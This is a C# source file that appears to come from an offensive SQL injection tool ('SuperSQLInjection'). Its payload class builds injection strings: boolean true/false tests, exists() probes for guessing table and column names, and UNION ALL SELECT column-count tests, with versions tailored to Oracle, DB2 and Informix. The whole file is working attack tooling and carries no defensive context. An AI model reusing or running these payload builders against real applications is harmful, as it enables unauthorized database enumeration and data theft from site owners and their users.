using System;
using System.Collections.Generic;
using System.Text;
using tools;

namespace SuperSQLInjection.payload
{
    class Comm
    {

        public const String COLUMNS_SPLIT_STR = "$\t$";
        public const String COLUMNS_REG_SPLIT_STR = "\\$\\t\\$";

        public static String COLUMNS_SPLIT_HEX_STR = Tools.strToHex(COLUMNS_SPLIT_STR, "UTF-8");
        public static String exists_table = " exists(select 1 from {0})";
        public static String exists_column = " exists(select {0} from {1})";
        public static String truePayload = " 1=1";
        public static String falsePayload = " 1=2";

        public static String unionColumns(List<String> columns, String unionStr)
        {
            StringBuilder sb = new StringBuilder();
            foreach (String column in columns)
            {
                                sb.Append(column + unionStr);
            }
            sb.Remove(sb.Length - unionStr.Length, unionStr.Length);
            return sb.ToString();
        }


        public static String unionColumnCountTest(int maxColumn,String fill)
        {
            StringBuilder sb = new StringBuilder(" 1=2 union all select ");
            for (int i = 1; i <= maxColumn;i++ )
            {
                sb.Append(fill+"+"+i+",");
            }
            sb.Remove(sb.Length - 1, 1);
            return sb.ToString();
        }

        public static String unionColumnCountTestByOracle(int maxColumn, String fill)
        {
            StringBuilder sb = new StringBuilder(" 1=2 union all select ");
            for (int i = 1; i <= maxColumn; i++)
            {
                sb.Append(fill + ",");
            }
            sb.Remove(sb.Length - 1, 1);
            return sb.ToString()+" from dual";
        }

        public static String unionColumnCountTestByOracle(int maxColumn,int testIndex,String fill)
        {
            
            return unionColumnCountTest(maxColumn,testIndex,fill) + " from dual";
        }

        public static String unionColumnCountTestByDB2(String unionTempaldate, String fill)
        {
            StringBuilder sb = new StringBuilder(" 1=2 union all select ");
            sb.Append(unionTempaldate.Replace("{data}", fill));
            sb.Append(" from sysibm.sysdummy1");
            return sb.ToString();
        }

        public static String unionColumnCountTestByInformix(String unionTempaldate, String fill)
        {
            StringBuilder sb = new StringBuilder(" 1=2 union all select ");
            sb.Append(unionTempaldate.Replace("{data}", fill));
            sb.Append(" from sysmaster:sysdual");
            return sb.ToString();
        }


        public static String unionColumnCountTest(int maxColumn, int testIndex, String fill)
        {
            StringBuilder sb = new StringBuilder(" 1=2 union all select ");
            for (int i = 1; i <= maxColumn; i++)
            {
                if (i == testIndex)
                {
                    sb.Append(fill + ",");
                }
                else
                {
                    sb.Append("null" + ",");
                }
            }
            sb.Remove(sb.Length - 1, 1);
            return sb.ToString();
        }



    }
}
